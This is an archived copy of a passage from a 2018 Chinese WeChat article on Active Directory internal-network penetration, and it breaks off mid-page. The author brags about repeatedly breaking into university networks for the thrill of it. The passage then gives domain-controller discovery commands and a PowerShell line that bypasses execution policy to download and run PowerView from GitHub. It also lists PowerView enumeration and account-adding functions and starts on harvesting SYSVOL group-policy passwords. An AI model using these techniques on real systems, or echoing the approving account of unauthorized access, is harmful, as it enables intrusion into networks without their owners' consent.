<html>
<head>
<title>我所了解的内网渗透-内网渗透知识大总结</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
我所了解的内网渗透 - 内网渗透知识大总结
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    mx7krshell
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2018-12-05</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);" data-mpa-powered-by="yiban.io"><img class="size-full wp-image-92732 aligncenter" data-ratio="0.54375" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/1_WUU0kialMhskZr6viaiaibYYBgANgA.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibV5e5G5h8Yb16glVTZ0ecPyF3svNsaWUU0kialMhskZr6viaiaibYYBgANgA/640?wx_fmt=jpeg'" data-type="jpeg" data-w="800" height="435" style="vertical-align: middle;border-style: none;display: block;margin: 12px 0px;top: auto;left: auto;right: auto;bottom: auto;" width="800"  /></p><blockquote style="margin-bottom: 20px;font-size:14px;line-height:34px;;background: rgb(247, 247, 247);padding: 10px 20px;border-left-width: 5px;border-left-color: rgba(25, 148, 145, 0.27);color: rgba(25, 148, 145, 0.97);margin-block-start: 1em;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;white-space: normal;"><p style="margin-bottom: 1rem;"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">在没工作之前我常年搞各种高校的网络，边界口漏洞多容易进入而内网机器环境多不严格真是内网渗透的好地方，最后被誉为”学校杀手”，之前搞学校方法简单而粗爆很多内网常识都不懂就是各种扫，反正学校管理员的密码都是一样的就算不是域控密码基本都是一样，就算密码不是一样都是有规律。不过没有任何目的就是一味着登录各种系统的快感，输入密码按下回车键进入的快感。</span></p></blockquote><h2 name="h2-0" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:22px;line-height:42px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">信息收集</span></a></h2><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">网上各种前期信息收集的文章各种net view之类的这里就不贴了。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">一般想知道哪一台是域控知道自己内网的DNS就可以了，一般域控安装都有安装DNS有些不止一台，其次是通过扫描获取开放端口为389机器或者使用NLTEST命令查看。最后就是各种网络查看查看域控是哪台主机</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs nginx" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">nltest</span> /DCLIST:pentest.com</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.12924071082390953" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/2_RDUwWibn4jxcPiaqwV6g7dr0ibMlcg.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVdcEJru1711UrKpmia5wicDDfHJfQMRDUwWibn4jxcPiaqwV6g7dr0ibMlcg/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1238" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">这里利用PowerTools的中的PowerView的信息收集其实很多功能都是净命令这里只是以PowerShell的方式实现</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs apache" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-attribute" style="font-size:14px;line-height:34px;;color: rgb(0, 0, 128);">Powershell</span>.exe -Nop -NonI -Exec Bypass <span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">"IEX (New.ObjectNet.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Get-HostIP"</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.06217070600632244" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/3_gm0KmmickwEHpNibnesbbuqtOjqqbw.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVriaJGoEEXWYdXlfKiceIkibFdmYibUgm0KmmickwEHpNibnesbbuqtOjqqbw/640?wx_fmt=jpeg'" data-type="jpeg" data-w="1898" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">更详细参考：</span><span style="font-size:14px;line-height:34px;;">域渗透信息收集PowerTools的</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);text-align: center;"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://github.com/cheetz/PowerTools</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs python" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;">Get-NetDomain &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - &nbsp; gets the name of the current use<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">r's domain
Get-NetForest &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - &nbsp; gets the forest associated with the current user'</span>s domain
Get-NetForestDomains &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets all domains <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">for</span> the current forest
Get-NetDomainControllers &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets the domain controllers <span class="hljs-keyword" style="font-size:14px;line-height:34px;;font-weight: bold;">for</span> the current compute<span class="hljs-string" style="font-size:14px;line-height:34px;;color: rgb(221, 17, 68);">r's domain
Get-NetCurrentUser &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets the current [domain\]username
Get-NetUser &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - &nbsp; returns all user objects, or the user specified (wildcard specifiable)
Get-NetUserSPNs &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - &nbsp; gets all user ServicePrincipalNames
Get-NetOUs &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets data for domain organization units
Get-NetGUIDOUs &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; finds domain OUs linked to a specific GUID
Invoke-NetUserAdd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - &nbsp; adds a local or domain user
Get-NetGroups &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - &nbsp; gets a list of all current groups in the domain
Get-NetGroup &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets data for each user in a specified domain group
Get-NetLocalGroups &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets a list of localgroups on a remote host or hosts
Get-NetLocalGroup &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - &nbsp; gets the members of a localgroup on a remote host or hosts
Get-NetLocalServices &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets a list of running services/paths on a remote host or hosts
Invoke-NetGroupUserAdd &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; adds a user to a specified local or domain group
Get-NetComputers &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets a list of all current servers in the domain
Get-NetFileServers &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; get a list of file servers used by current domain users
Get-NetShare &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets share information for a specified server
Get-NetLoggedon &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - &nbsp; gets users actively logged onto a specified server
Get-NetSessions &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - &nbsp; gets active sessions on a specified server
Get-NetFileSessions &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; - &nbsp; returned combined Get-NetSessions and Get-NetFiles
Get-NetConnections &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets active connections to a specific server resource (share)
Get-NetFiles &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets open files on a server
Get-NetProcesses &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;- &nbsp; gets the remote processes and owners on a remote server</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">&nbsp;</span><span style="font-size:14px;line-height:34px;;color: rgba(0, 0, 0, 0.85);">获取域方法</span></p><h3 name="h3-2" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:19px;line-height:39px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">SYSVOL</span></h3><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">SYSVOL是指存储域公共文件服务器副本的共享文件夹，它们在域中所有的域控制器之间复制.Sysvol文件夹是安装AD时创建的，它用来存放GPO，脚本等信息。同时，存放在Sysvol文件文件夹中的信息，会复制到域中所有DC上。</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用组策略首选项配置组策略批量修改用户本地管理员密码</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">开始 - &gt;管理工具 - &gt;组策略管理 - &gt;在这个域中创建GPO</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">设置 - 右键 - 编辑 - 用户配置 - 首选项 - 控制面板设置 - 本地用户和组</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.7058823529411765" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/4_4QichjkZjMhXCM8j75C6CsWnQqrLGQ.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibV2rYCNO4dFiasaymMmSic7WecyrR4QichjkZjMhXCM8j75C6CsWnQqrLGQ/640?wx_fmt=jpeg'" data-type="jpeg" data-w="816" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">更新管理员密码：</span></p><p 